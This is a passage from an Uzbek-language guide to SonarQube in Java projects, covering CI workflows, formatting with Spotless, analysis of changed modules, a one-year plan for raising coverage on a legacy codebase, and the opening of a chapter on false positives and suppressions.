on: [pull_request]
jobs:
  fast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { java-version: '21', distribution: 'temurin', cache: 'maven' }
      # Format va kompilyatsiya: 1-2 daqiqa, darhol javob beradi.
      - run: mvn -B -q spotless:check compile

  analysis:
    needs: fast          # fast yiqilsa, bu job umuman ishlamaydi
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }   # New Code hisobi uchun to'liq tarix shart
      - uses: actions/setup-java@v4
        with: { java-version: '21', distribution: 'temurin', cache: 'maven' }
      - run: mvn -B clean verify sonar:sonar -Dsonar.qualitygate.wait=true
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
```

`fetch-depth: 0` ni yozib qo'yish muhim. Sayoz clone da Sonar New Code ni to'g'ri aniqlay olmaydi va yangi kod o'rniga butun faylni yangi deb hisoblashi mumkin.

### 22.9 Jamoada bir xil sozlama: formatlash, linter, IDE konfiguratsiyasi

Agar har kim o'z IDE sozlamasi bilan ishlasa, diff lar formatlash o'zgarishlari bilan to'ladi. Sonar bunda ikki marta zarar ko'radi: birinchidan New Code hajmi sun'iy o'sadi, ikkinchidan review da haqiqiy o'zgarish ko'rinmay qoladi.

Yechim sozlamani repozitoriyga ko'chirish. Formatlash qoidasi `pom.xml` da yashaydi va Spotless orqali majburlanadi. Tahrirlovchi xulqi `.editorconfig` da yashaydi va deyarli hamma IDE uni o'qiydi.

```xml
<!-- pom.xml: Spotless. Formatlash qoidasi kodda yashaydi, IDE da emas. -->
<plugin>
  <groupId>com.diffplug.spotless</groupId>
  <artifactId>spotless-maven-plugin</artifactId>
  <version>2.44.0</version>
  <configuration>
    <java>
      <googleJavaFormat><style>AOSP</style></googleJavaFormat>
      <removeUnusedImports/>
      <!-- Ishlatilmagan import Sonar da ham code smell, shu yerda yo'qoladi. -->
      <trimTrailingWhitespace/>
      <endWithNewline/>
    </java>
  </configuration>
  <executions>
    <execution>
      <!-- check ni verify ga bog'lash: CI da ham, lokal da ham bir xil. -->
      <goals><goal>check</goal></goals>
      <phase>verify</phase>
    </execution>
  </executions>
</plugin>
```

Connected mode sozlamasini ham umumiy qilish mumkin. IntelliJ `.idea/sonarlint` papkasini yozadi va unda server ulanishi nomi hamda projectKey bog'lanishi saqlanadi. Bu fayllarni repozitoriyga qo'shish mumkin, lekin token hech qachon unda bo'lmaydi: token har bir developerning o'z IDE kalit saqlovchisida qoladi.

Yana bitta amaliy qoida: Java versiyasi bir xil bo'lsin. Agar birov Java 17 da, boshqasi Java 25 da kompilyatsiya qilsa, ba'zi Sonar qoidalari boshqacha ishlaydi. `maven.compiler.release` ni `pom.xml` da qattiq belgilash kerak, va `.sdkmanrc` yoki shunga o'xshash fayl bilan JDK ni ham qayd qilish kerak.

### 22.10 Lokal tahlilni tezlashtirish: faqat o'zgargan modulni tekshirish

Ko'p modulli loyihada butun reaktorni tahlil qilish uzoq ketadi. Maven da `-pl` va `-am` flaglari shuni hal qiladi. `-pl` qaysi modul, `-am` esa uning bog'liqliklarini ham qurishni bildiradi.

```bash
# 1. Diff dan o'zgargan modullarni topish.
BASE=${1:-origin/main}
MODULES=$(git diff --name-only "$BASE"...HEAD \
  | awk -F/ '/^[a-z0-9-]+\/src\//{print $1}' | sort -u | paste -sd, -)

if [ -z "$MODULES" ]; then
  echo "Java modullarda o'zgarish yo'q, tahlil kerak emas."
  exit 0
fi
echo "O'zgargan modullar: $MODULES"

# 2. Faqat shu modullarni va ularning bog'liqliklarini qurish va testlash.
mvn -B -T 1C clean verify -pl "$MODULES" -am -DskipITs

# 3. Shu modullar uchun lokal Sonar tahlili, alohida branch nomi bilan.
mvn -B sonar:sonar -pl "$MODULES" \
  -Dsonar.branch.name="local-$(git rev-parse --abbrev-ref HEAD)" \
  -Dsonar.token="$SONAR_TOKEN"
```

Tezlikni oshiradigan boshqa vositalar ham bor. `-T 1C` har protsessor yadrosiga bitta thread beradi va ko'p modulli build ni sezilarli tezlashtiradi. `-o` offline rejim, bog'liqliklar allaqachon yuklangan bo'lsa tarmoqqa chiqmaydi. `-DskipITs` integratsion testlarni tashlab ketadi, ular odatda eng sekin qismi.

Lekin bitta ogohlantirish bor va u muhim. Qisman tahlil Sonar da to'liq rasmni bermaydi. Agar sen faqat bitta modulni tahlil qilib yuborsan, qolgan modullarning oldingi natijasi serverda eski holida qoladi. Shu sababli qisman tahlil lokal ishchi vositasi, CI da esa har doim to'liq tahlil bo'lishi kerak.

Duplicated code ayniqsa shunday. U modullar orasida ham topiladi, shuning uchun bitta modulni tahlil qilib "takrorlanish yo'q" degan xulosa chiqarish xato. Quality gate hisobini faqat CI dagi to'liq tahlil beradi.

### 22.11 Amalda qo'llash

- [ ] IDE ga SonarQube for IDE pluginini o'rnat va server bilan connected mode ni yoq, shundan keyin IDE profili server profiliga mos keladi.
- [ ] `curl -s -u "$SONAR_TOKEN:" "$SONAR_HOST_URL/api/authentication/validate"` bilan tokenni tekshir va uni faqat IDE kalit saqlovchisida qoldir.
- [ ] JaCoCo `report` goal ini `verify` fazasiga bog'la, keyin `mvn clean verify -DskipITs` ishlatib `target/site/jacoco/index.html` ni ochib qizil va sariq qatorlarni ko'r.
- [ ] `.githooks/pre-commit` yoz: Spotless apply, offline compile va secret grep, keyin `git config core.hooksPath .githooks` ni bajar.
- [ ] Spotless va `.editorconfig` ni repozitoriyga qo'shib, `spotless:check` ni `verify` fazasiga bog'la, shunda formatlash diff lari yo'qoladi.
- [ ] CI da `fast` va `analysis` joblarini ajrat, `analysis` ga `needs: fast` qo'y va checkout da `fetch-depth: 0` ber.
- [ ] Ko'p modulli loyihada diff dan modul nomini topib `mvn verify -pl <modullar> -am -T 1C` bilan lokal halqani qisqartir, lekin CI da to'liq tahlil qoldir.
- [ ] PR ochishdan oldin bir marta `mvn clean verify sonar:sonar -Dsonar.qualitygate.wait=true` ni lokal branch nomi bilan ishlatib, gate javobini oldindan ko'r.

## 23. Legacy loyihani 100% ga olib chiqish rejasi (Bringing a Legacy Project to 100)

Legacy loyihani Sonar ko'rsatkichlari bo'yicha "100% ga olib chiqish" degan gap ko'pincha noto'g'ri tushuniladi. Maqsad barcha issue ni nolga tushirish emas, balki quality gate ni barqaror yashil holatda tutib turish va yangi kodni toza yozish. Bu bob o'n ikki yillik kod bazasiga Sonar ni kiritishdan boshlab, bir yil ichida o'lchanadigan natijaga chiqishgacha bo'lgan rejani beradi. Refaktoring usullari arxitektor hujjatida, bu yerda faqat ko'rsatkichlar va jarayon.

### 23.1 Birinchi tahlil: minglab issue chiqqanda vahimaga tushmaslik

Birinchi skan deyarli har doim shok beradi. 300 ming qatorlik Spring monolitida 8 mingdan 40 minggacha issue va 2 dan 6 foizgacha coverage ko'rish normal holat. Bu raqam loyihaning yomonligini emas, Sonar hali hech qachon ishlamaganini ko'rsatadi.

Birinchi skanni hech kimga ko'rsatmasdan, hech qanday qaror qabul qilmasdan oling. Faqat ma'lumot to'playsiz.

```bash
# Birinchi skan: hech qanday quality gate shartisiz, faqat o'lchov uchun.
# Avval testlarni va JaCoCo hisobotini tayyorlaymiz, aks holda coverage 0 ko'rinadi.
mvn -B clean verify -DskipITs=false

# Keyin skan. sonar.qualitygate.wait bermaymiz: hozir muvaffaqiyat emas, surat kerak.
mvn -B sonar:sonar \
  -Dsonar.projectKey=billing-legacy \
  -Dsonar.host.url=https://sonar.internal \
  -Dsonar.token=$SONAR_TOKEN \
  -Dsonar.scm.provider=git

# Git tarixi to'liq bo'lsin, aks holda "yangi kod" ni aniqlash buziladi.
# CI da shallow clone bo'lsa, chuqurlikni oshiring:
git fetch --unshallow || true
```

Shallow clone eng ko'p uchraydigan xato. Sonar qatorning sanasini SCM dan oladi. Tarix kesilgan bo'lsa, butun fayl "yangi kod" ko'rinadi va gate asossiz qizil bo'ladi.

### 23.2 Boshlang'ich holatni qayd etish va uni taqqoslash nuqtasi qilish

Birinchi skandan keyin ko'rsatkichlarni o'z omboringizga yozib qo'ying. Sonar o'zi tarixni saqlaydi, lekin loyiha sozlamasi o'zgarsa taqqoslash buziladi. Shuning uchun asosiy raqamlarni tashqarida, o'zgarmas holda qayd etish kerak.

```sql
-- O'z kuzatuv jadvalimiz. Sonar bazasiga to'g'ridan-to'g'ri so'rov yubormaymiz:
-- uning sxemasi versiyadan versiyaga o'zgaradi va bu qo'llab-quvvatlanmaydi.
-- Raqamlarni Web API dan olib, shu jadvalga yozamiz.
CREATE TABLE sonar_snapshot (
    taken_on        date         NOT NULL,
    project_key     varchar(100) NOT NULL,
    metric_key      varchar(60)  NOT NULL,
    metric_value    numeric(14,2) NOT NULL,
    PRIMARY KEY (taken_on, project_key, metric_key)
);

-- Boshlang'ich holat (baseline) ni alohida belgilaymiz.
INSERT INTO sonar_snapshot VALUES
  ('2026-01-13','billing-legacy','ncloc',           312450),
  ('2026-01-13','billing-legacy','violations',       21894),
  ('2026-01-13','billing-legacy','coverage',             4.10),
  ('2026-01-13','billing-legacy','sqale_index',     128400),
  ('2026-01-13','billing-legacy','duplicated_lines_density', 11.70);

-- Oylik o'sishni ko'rish uchun oddiy taqqoslash.
SELECT metric_key, metric_value
FROM sonar_snapshot
WHERE project_key = 'billing-legacy' AND taken_on = DATE '2026-01-13';
```

`sqale_index` daqiqalarda o'lchanadigan texnik qarz baholovi. 128400 daqiqa taxminan 267 odam-kun degani. Bu raqamni rahbarga ko'rsatishdan oldin tushuning: u Sonar ning o'z taxminiy modeli, haqiqiy mehnat emas.

### 23.3 "Clean as you code" ni birinchi kundan yoqish

Clean as you code tamoyili oddiy: eski kod qanday bo'lsa qolsin, lekin bugun tekkan har bir qator toza bo'lsin. Sonar bu tamoyilni "new code" tushunchasi bilan amalga oshiradi. Gate shartlari faqat yangi kodga qo'yiladi va umumiy 21 ming issue gate ni qizil qilmaydi.

Yangi kod chegarasini to'g'ri tanlash butun rejaning poydevori. Legacy loyiha uchun eng barqaror variant: oldingi versiyadan keyingi kod.

```properties
# sonar-project.properties yoki pom.xml dagi xossalar

# Yangi kod chegarasi. Legacy uchun uchta real variant bor:
#   previous_version  - oxirgi release dan keyingi o'zgarishlar (monolit uchun eng yaxshi)
#   number_of_days    - oxirgi N kun (tez release qiladigan jamoa uchun)
#   reference_branch  - main bilan farq (feature branch modeli uchun)
# Buni UI da ham qo'yish mumkin, lekin faylda saqlash tavsiya etiladi.
sonar.projectVersion=14.3.0

# Coverage hisobotini Sonar o'zi hisoblamaydi, JaCoCo dan o'qiydi.
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco-aggregate/jacoco.xml

# Generatsiya qilingan kodni skandan chiqaramiz: u bizning qarzimiz emas.
sonar.exclusions=**/generated/**,**/*MapperImpl.java,**/db/migration/**

# Coverage talabidan chiqaramiz, lekin issue tahlilida qoldiramiz.
sonar.coverage.exclusions=**/config/**,**/*Application.java,**/dto/**

# Testlarning o'zini alohida ko'rsatamiz, aks holda ular asosiy kod sanaladi.
sonar.sources=src/main/java
sonar.tests=src/test/java
```

`previous_version` ni tanlasangiz, har release da chegara avtomatik suriladi. Bu legacy uchun qulay: jamoa ikki hafta ichida yozgan kod ustida javob beradi, ikki yil oldingi kod ustida emas.

### 23.4 Yangi kod shartlarini darhol qattiq qo'yish, eski kodni bosqichma-bosqich tuzatish

Bu ikkilik rejaning yuragi. Yangi kodga bugundan qattiq shart, eski kodga uzoq muddatli yumshoq reja.

Yangi kod uchun gate shartlari birinchi kundan quyidagicha bo'lsin: new code coverage 80 foizdan kam bo'lmasin, yangi duplication 3 foizdan oshmasin, yangi blocker va critical issue nol bo'lsin, yangi security hotspot lar ko'rib chiqilgan bo'lsin. Bu shartlar amalda qiyin emas, chunki ular faqat o'zgargan qatorlarga tegishli.

```yaml
# .github/workflows/quality.yml
name: quality
on: [pull_request]

jobs:
  sonar:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0          # SCM tarixi to'liq bo'lsin, bu shart
      - uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: temurin
          cache: maven

      # Test va coverage hisoboti. Bu bosqich yiqilsa skan ham ma'nosiz.
      - run: mvn -B clean verify

      # Skan va gate natijasini kutish. wait=true bo'lmasa PR qizil bo'lmaydi.
      - run: >
          mvn -B sonar:sonar
          -Dsonar.qualitygate.wait=true
          -Dsonar.qualitygate.timeout=600
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```

Eski kod uchun esa kvota usuli ishlaydi: har sprintda jamoa ma'lum miqdor eski issue ni yopadi, lekin bu gate shartiga bog'lanmaydi. Gate ni eski kod bilan bog'lasangiz, birinchi haftada butun jamoa uni o'chirishni talab qiladi.

### 23.5 Eski issue larni toifalash: tuzatish, qoldirish, qoidani o'chirish

21 ming issue ning hammasi haqiqiy muammo emas. Har bir issue uchta yo'ldan birini oladi va bu qarorni jamoa bilan birga, qoida bo'yicha guruhlab qabul qilish kerak.

Tuzatish: reliability va security toifasidagi, ishlab turgan kodga tegishli issue lar. Null dereference, resurs yopilmasligi, SQL ni qo'lda yig'ish. Bular haqiqiy xavf.

Qoldirish: `Won't Fix` yoki `Accept` holati. Masalan naming konvensiyasi bo'yicha eski DTO lardagi minglab shikoyat. Ularni tuzatish katta diff beradi, foydasi kam.

Qoidani o'chirish: agar qoida loyihaning ongli qaroriga qarshi bo'lsa, uni quality profile dan olib tashlash halolroq. Masalan `java:S1192` takrorlangan string literal lar haqida. Jamoa SQL so'rovlarini inline saqlashga qaror qilgan bo'lsa, qoidani o'chirish ming marta `Won't Fix` bosishdan yaxshi.

Eng katta xato: issue larni `False Positive` deb belgilash. Bu holat qoida xato ishlaganini bildiradi. Siz shunchaki tuzatmaslikka qaror qilgan bo'lsangiz, `Accept` ishlating. Aks holda bir yildan keyin hech kim nima uchun nima belgilanganini tushunmaydi.

| Tuzoq | Nima bo'ladi | Yechim |
|---|---|---|
| Birinchi kundan umumiy coverage 80% talab qilish | Jamoa gate ni butunlay o'chiradi | Faqat new code coverage ga shart qo'yish |
| Shallow clone bilan skan | Butun kod "yangi" ko'rinadi, gate qizil | `fetch-depth: 0` va `--unshallow` |
| Generatsiya qilingan kod skanda | Minglab soxta issue, sqale_index shishadi | `sonar.exclusions` da chiqarish |
| JaCoCo hisoboti yo'q | Coverage 0 ko'rinadi, sabab topilmaydi | `verify` dan keyin skan, xml yo'lini berish |
| Issue ni `False Positive` deb yopish | Qoida statistikasi buziladi, audit yo'qoladi | Ongli qaror bo'lsa `Accept`, izoh bilan |
| Mock bilan coverage ko'tarish | Raqam o'sadi, bug topilmaydi | Assert siz testni review da rad etish |
| Module bo'yicha reja yo'q | Butun kod bazasida tarqoq tuzatish, natija ko'rinmaydi | Modulni xavf bo'yicha tanlash |
| Gate ni o'chirib qo'yish va esdan chiqarish | Olti oydan keyin holat yomonlashgan | Gate holatini oylik hisobotga kiritish |

### 23.6 Qaysi modulni birinchi tozalash: xavf va o'zgarish tezligiga qarab

Barcha modulni birdan qo'lga olish mumkin emas. Tanlovni ikki o'q bo'yicha qiling: modulning biznes xavfi va o'zgarish tezligi.

O'zgarish tezligini git dan o'lchash mumkin. Oxirgi yil ichida eng ko'p commit tekkan paketlar birinchi navbatda tozalanadi, chunki ular jamoa har kuni tegadigan joy.

```bash
# Oxirgi 12 oyda eng ko'p o'zgargan paketlar: tozalash navbatini shu belgilaydi.
git log --since='12 months ago' --name-only --pretty=format: \
  | grep '^src/main/java' \
  | sed 's#/[^/]*$##' \
  | sort | uniq -c | sort -rn | head -15

# Shu paketlar uchun Sonar dagi issue zichligini olamiz (API, baza emas).
curl -s -u "$SONAR_TOKEN:" \
  "https://sonar.internal/api/measures/component_tree?component=billing-legacy\
&metricKeys=violations,coverage,ncloc&qualifier=DIR&ps=100&s=metric&metricSort=violations" \
  | jq -r '.components[] | [.path, .measures[].value] | @tsv'

# Ikki ro'yxat kesishgan joy: tez o'zgaradi va ko'p issue bor. Shundan boshlanadi.
```

Xavf bo'yicha birinchi o'rinda pul bilan ishlaydigan kod turadi. To'lov, hisob-faktura, ombor qoldig'i. Hisobot generatori yoki admin paneli oxirgi navbatda bo'lishi mumkin, chunki undagi xato arzon.

### 23.7 Qamrovni bosqichma-bosqich oshirish rejasi va oraliq maqsadlar

4 foizdan 80 foizga bir sakrashda chiqish mumkin emas va kerak ham emas. To'g'ri reja: new code coverage ni birinchi kundan 80 da tutish, umumiy coverage ni esa tabiiy o'sishga qo'yish.

Matematika oddiy. Jamoa oyda 6 ming qator kod o'zgartirsa va uning 80 foizi qoplansa, umumiy coverage oyiga 1.3 dan 1.8 foizgacha o'sadi. Bir yilda bu 20 foizdan oshadi.

Oraliq maqsadlarni modul darajasida qo'ying, umumiy raqamda emas. "To'lov moduli coverage 70 foiz" aniq va bajariladigan maqsad. "Loyiha coverage 50 foiz" esa hech kimning mas'uliyatida emas.

```xml
<!-- JaCoCo: modul darajasida chegara. Bu Sonar gate dan mustaqil ishlaydi. -->
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <!-- prepare-agent va report execution lari odatdagicha qoladi -->
    <execution>
      <id>module-minimum</id>
      <phase>verify</phase>
      <goals><goal>check</goal></goals>
      <configuration>
        <rules>
          <rule>
            <element>PACKAGE</element>
            <includes><include>com.acme.billing.payment.*</include></includes>
            <limits>
              <!-- Chegarani har chorakda qo'lda ko'taramiz: 0.40 -> 0.55 -> 0.70 -->
              <limit><counter>LINE</counter><value>COVEREDRATIO</value>
                     <minimum>0.55</minimum></limit>
            </limits>
          </rule>
        </rules>
      </configuration>
    </execution>
  </executions>
</plugin>
```

JaCoCo versiyasi 0.8.x liniyasida Java versiyasi bilan moslik muhim. Yangi Java chiqqanda JaCoCo ni ham yangilash kerak, aks holda bytecode o'qilmaydi va coverage jim turib nolga tushadi.

### 23.8 Testsiz kodga test yozish tartibi: avval xatti-harakatni qayd etish

Testsiz legacy metodga test yozishning to'g'ri tartibi bitta: avval kodning hozirgi xatti-harakatini qanday bo'lsa shundayligicha qayd etish, keyin o'zgartirish. Bu testning maqsadi kodning to'g'riligini tasdiqlash emas, o'zgarishdan keyin xatti-harakat o'zgarmaganini ushlash.

```java
// Legacy metod: 180 qator, java:S3776 cognitive complexity shikoyati bor.
// Uni hozir tuzatmaymiz. Avval hozirgi javobini qotirib yozamiz.
@ParameterizedTest
@CsvSource({
    // summa, mijoz turi, kutilgan komissiya (hozirgi koddan olingan, kitobdan emas)
    "100.00, RETAIL,    2.50",
    "100.00, PARTNER,   1.00",
    "0.00,   RETAIL,    0.00",
    "999999.99, PARTNER, 4999.99",   // yuqori chegara: hozir shunday ishlaydi
    "-5.00,  RETAIL,    0.00"        // manfiy summa: xato tashlamaydi, 0 qaytaradi
})
void hozirgiKomissiyaniQaydEtadi(BigDecimal summa, String tur, BigDecimal kutilgan) {
    // Bu assert "to'g'ri" emas, "hozirgi" qiymatni tekshiradi.
    assertThat(legacyCalculator.commission(summa, tur))
        .isEqualByComparingTo(kutilgan);
}

// Manfiy summada 0 qaytarish xato bo'lsa, u alohida ticket bo'ladi.
// Testni refaktoring paytida o'zgartirmaymiz: aks holda himoya yo'qoladi.
```

Kutilgan qiymatlarni koddan oling, spetsifikatsiyadan emas. Agar kod xato ishlayotgan bo'lsa, buni testda izoh bilan belgilang va alohida ticket ochin. Refaktoring va bug tuzatishni bitta PR da qo'shsangiz, nima nimani buzganini aniqlash imkoni qolmaydi.

Sonar nuqtai nazaridan bu testlar darhol foyda beradi: o'zgargan qatorlar new code ga tushadi va ular qoplangan bo'ladi, gate yashil qoladi.

### 23.9 Jamoani jarayonga qo'shish va vaqt ajratish masalasi

Eng ko'p uchraydigan muvaffaqiyatsizlik sababi texnik emas: jamoa Sonar ni "yana bitta to'siq" deb qabul qilsa, reja o'ladi. Uch narsa yordam beradi.

Birinchisi: sprint sig'imining aniq ulushini ajratish. 15 foiz odatiy raqam, ya'ni ikki haftalik sprintda bir odam uchun taxminan bir kun. Bu ulush rejada ko'rinsin, "bo'sh vaqtda" degan gap ishlamaydi.

Ikkinchisi: qoidalarni jamoa bilan birga tanlash. Quality profile ni bir kishi tuzib bermasin. Birinchi oyda jamoa bilan o'tirib, eng ko'p chiqqan 30 qoidani ko'rib chiqing va har biri uchun qoldirish yoki o'chirish qarorini birga qabul qiling.

Uchinchisi: gate qizil bo'lganda yechimni ko'rsatish. Sonar PR ga yozgan izohdan nima qilish kerakligi tushunarli bo'lsin.

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Birinchi skan natijasi | Butun jamoaga tarqatish, vahima | Jim o'lchov, keyin reja bilan birga ko'rsatish |
| Gate shartlari | Umumiy kodga 80% coverage | Faqat new code ga shart, eski kodga kvota |
| Yangi kod chegarasi | Standart sozlama qoldiriladi | `previous_version` ongli tanlanadi, release ga bog'lanadi |
| Issue larni yopish | Hammasi `False Positive` | Toifaga qarab tuzatish, `Accept` yoki qoidani o'chirish |
| Navbat belgilash | Fayl ro'yxatining boshidan | Git o'zgarish tezligi va biznes xavfi kesishmasi |
| Coverage o'sishi | Bir chorakda 50% ga chiqish rejasi | Oyiga 1.5% tabiiy o'sish, modul maqsadlari bilan |
| Legacy ga test | Spetsifikatsiya bo'yicha "to'g'ri" test | Hozirgi xatti-harakatni qayd etish, keyin o'zgartirish |
| Jamoa vaqti | "Bo'sh vaqtda tuzatasiz" | Sprint sig'imining 15% rejada ajratilgan |
| Rahbarga hisobot | Issue soni kamaydi | Gate o'tish foizi, yangi kod sifati, incident soni |
| Gate yiqilganda | Shartni yumshatish | Sababni tuzatish, shart o'zgarmaydi |

### 23.10 Rahbarga rejani va kutilayotgan natijani tushuntirish

Rahbarga "texnik qarz" deb tushuntirish deyarli hech qachon ishlamaydi. Ishlaydigan til: xatolar narxi va yetkazib berish tezligi.

Uchta raqamni oldinga chiqaring: oxirgi olti oydagi production incident soni va ularning qanchasi test bilan tutilishi mumkin edi, bitta release tayyorlash vaqti, yangi developer ning birinchi PR ga chiqish vaqti.

So'rash kerak bo'lgan narsa ham aniq bo'lsin: sprint sig'imining 15 foizi, 12 oy muddat, har chorakda hisobot. Cheksiz "tozalash loyihasi" so'ramang, u birinchi muddat siqilishida bekor qilinadi.

Va'da berishda ehtiyot bo'ling. "Bir yildan keyin 100% o'tadi" deb aytmang. To'g'ri formula: bir yildan keyin har bir PR gate dan o'tadi, yangi kodning 80 foizi qoplangan bo'ladi, umumiy coverage 25 foiz atrofida bo'ladi. Bu kam ko'rinadi, lekin bu bajariladigan va'da.

### 23.11 Muvaffaqiyat o'lchovi: issue soni emas, nimani o'lchash kerak

Umumiy issue soni yomon ko'rsatkich. U qoida profilini o'zgartirish bilan bir kunda ikki baravar kamayadi va hech narsa yaxshilanmaydi.

O'lchash kerak bo'lgan ko'rsatkichlar boshqa. Gate o'tish foizi: oxirgi 30 kunda PR larning qanchasi birinchi urinishda yashil bo'ldi. New code coverage ning medianasi: jamoa 80 ni qiynalib ushlaydimi yoki bemalol oshib ketadimi. Yangi kodda paydo bo'lgan blocker va critical issue soni: bu nol bo'lishi kerak va nol bo'lmasa sabab bor. Tozalangan modullarning coverage i: maqsadli ish natijasi.

Tashqi ko'rsatkichlarni ham kuzating: production incident soni, hotfix soni, release vaqti. Sonar raqamlari yaxshilanib bu uchtasi joyida qolsa, siz raqam uchun ishlayapsiz.

```bash
# Oylik hisobot uchun kerakli ko'rsatkichlar. Natija o'z jadvalimizga yoziladi.
curl -s -u "$SONAR_TOKEN:" \
  "https://sonar.internal/api/measures/component?component=billing-legacy\
&metricKeys=new_coverage,new_violations,new_duplicated_lines_density,coverage,violations,sqale_index" \
  | jq -r '.component.measures[] | [.metric, (.value // .period.value)] | @tsv'

# Gate holati tarixini olish: oylik "yashil PR foizi" shundan hisoblanadi.
curl -s -u "$SONAR_TOKEN:" \
  "https://sonar.internal/api/qualitygates/project_status?projectKey=billing-legacy" \
  | jq -r '.projectStatus.status, (.projectStatus.conditions[] | "\(.metricKey) \(.status)")'
```

### 23.12 Bir yillik real jadval namunasi

Quyidagi jadval 300 ming qatorlik monolit va sakkiz kishilik jamoa uchun real taqsimlangan reja. Raqamlar sizning loyihangizda boshqacha bo'ladi, lekin bosqichlar tartibi saqlanadi.

| Oy | Asosiy ish | Gate holati | Kutilgan natija |
|---|---|---|---|
| 1 | Birinchi skan, baseline qayd etish, CI ga skan qo'shish | O'chirilgan | Raqamlar bor, jamoa Sonar ni ko'radi |
| 2 | Quality profile ni jamoa bilan tozalash, exclusions sozlash | Ogohlantirish | Soxta issue lar yo'q, profil ishonchli |
| 3 | New code gate ni yoqish, chegara `previous_version` | PR da majburiy | Yangi kod coverage 80 ga chiqadi |
| 4 | Eng tez o'zgaradigan modulni tanlash, characterization testlar | Majburiy | To'lov moduli coverage 35% |
| 5 | Shu modulda eski critical issue larni yopish | Majburiy | Reliability rating yaxshilanadi |
| 6 | Birinchi yarim yil hisoboti, chegaralarni qayta ko'rish | Majburiy | Umumiy coverage 12% atrofida |
| 7 | Ikkinchi modul: buyurtma va ombor qoldig'i | Majburiy | Ikki modul 50% dan oshadi |
| 8 | Security hotspot larni to'liq ko'rib chiqish | Majburiy | Barcha hotspot holati belgilangan |
| 9 | Duplication bilan maqsadli ish, umumiy 11.7% dan pasayish | Majburiy | Duplication 7% ga tushadi |
| 10 | Eng murakkab metodlarga test, keyin arxitektor rejasi bo'yicha bo'lish | Majburiy | Cognitive complexity issue lari kamayadi |
| 11 | Qolgan modullarga minimal coverage chegarasi | Majburiy | Hech bir modul 20% dan past emas |
| 12 | Yillik hisobot, keyingi yil maqsadlari | Majburiy | Umumiy coverage 25%, gate barqaror yashil |

Birinchi uch oyda hech qanday coverage o'sishi kutilmaydi. Bu normal. Uchinchi oydan keyin o'sish o'z-o'zidan boshlanadi, chunki jamoa boshqa tanlovi qolmaydi.

Yo'l davomida ikkita xavf bor. Birinchisi: gate ni "vaqtincha" o'chirish, chunki o'chirilgan gate deyarli qaytib yonmaydi. Ikkinchisi: chegaralarni jim ko'tarmaslik. Jamoa new code coverage da bemalol 92 ga chiqsa, shartni 85 ga ko'tarish kerak.

### 23.13 Amalda qo'llash

- [ ] Birinchi skanni `fetch-depth: 0` bilan oling va hech qanday gate shartisiz baseline raqamlarini o'z jadvalingizga yozib qo'ying.
- [ ] `sonar.exclusions` va `sonar.coverage.exclusions` ni sozlab, generatsiya qilingan kod va konfiguratsiya klasslarini skandan chiqaring, keyin skanni qayta yuritib raqamlar farqini qayd eting.
- [ ] Yangi kod chegarasini `previous_version` ga qo'ying va release jarayoni `projectVersion` ni haqiqatan oshirayotganini tekshiring.
- [ ] Quality gate da faqat new code shartlarini yoqing: coverage 80%, duplication 3%, yangi blocker va critical nol.
- [ ] Jamoa bilan bir majlis o'tkazib, eng ko'p chiqqan 30 qoida uchun tuzatish, `Accept` yoki profildan o'chirish qarorini birga qabul qiling.
- [ ] Git tarixidan eng tez o'zgaradigan 15 paketni chiqarib, biznes xavfi bilan kesishtiring va birinchi tozalanadigan modulni tanlang.
- [ ] Tanlangan modulga JaCoCo `check` chegarasini qo'ying va uni har chorakda qo'lda ko'tarishni kalendarga yozing.
- [ ] Oylik hisobot uchun gate o'tish foizi, new code coverage medianasi va production incident sonini birga ko'rsatadigan bitta jadval tayyorlang.

## 24. False positive, suppression va o'z qoidangiz (False Positives and Custom Rules)

Har bir jamoada bir kun shu savol tug'ilad: "Sonar xato qilyapti, buni qanday o'chiramiz?". Javob oson emas, chunki bostirishning to'rt xil yo'li bor va ularning har biri boshqa odamga boshqa narsani ko'rsatadi. Bu bobda haqiqiy false positive ni shunchaki noqulay qoidadan ajratishni, bostirishni qayerda va qanday qayd etishni, va qachon qoidani butunlay o'chirish eng halol qaror bo'lishini ko'rib chiqamiz. Oxirida bostirishlar sonini metrika sifatida kuzatish tartibi bor, chunki kuzatilmagan suppression bir yilda minglab bo'lib ketadi.

### 24.1 False positive nima va u qanchalik tez-tez uchraydi

False positive deganda qoida ishga tushdi, lekin kodda haqiqiy muammo yo'q holat tushuniladi. Uni uchta boshqa holatdan ajratish kerak. Birinchisi, qoida haq, lekin jamoa uni yoqtirmaydi. Ikkinchisi, qoida haq, lekin bu yerda tuzatish narxi foydadan katta. Uchinchisi, analizator kontekstni ko'rmagani uchun xato qilgan. Faqat uchinchisi false positive.

Tajribada eng ko'p sabab analizatorning klasspathni to'liq ko'rmasligi. Agar `sonar.java.binaries` yoki kutubxonalar ro'yxati to'liq bo'lmasa, analizator tiplarni yecha olmaydi va nullability haqidagi xulosalari buziladi. Shu sababdan paydo bo'lgan shovqinni bostirish eng katta xato, chunki konfiguratsiyani tuzatsa o'zi yo'qoladi.

Ikkinchi sabab framework semantikasi. Spring konteyner maydonga qiymat quyadi, Lombok konstruktor generatsiya qiladi, MapStruct implementatsiya yozadi, JPA proxy yaratadi. Analizator buni har doim bilmaydi. Uchinchi sabab reflection va dinamik chaqiruvlar.

Aniq raqam bermayman, chunki u profilga va loyihaga qarab o'zgaradi. Ishonchli qoida shu: agar jamoada issue larning o'ndan biridan ko'pi false positive deb belgilansa, muammo Sonar da emas, sozlamada yoki profil tanlashda.

```java
// Sonar shikoyat qiladi: "possible null dereference" (java:S2259 turkumi)
// Sabab: @Autowired maydon konstruktorda to'ldirilmagan deb ko'rinadi
@Service
public class TolovService {
    @Autowired
    private TolovRepository repository; // analizator uchun null bo'lishi mumkin

    public BigDecimal jami(Long buyurtmaId) {
        return repository.summaByBuyurtma(buyurtmaId); // ogohlantirish shu qatorda
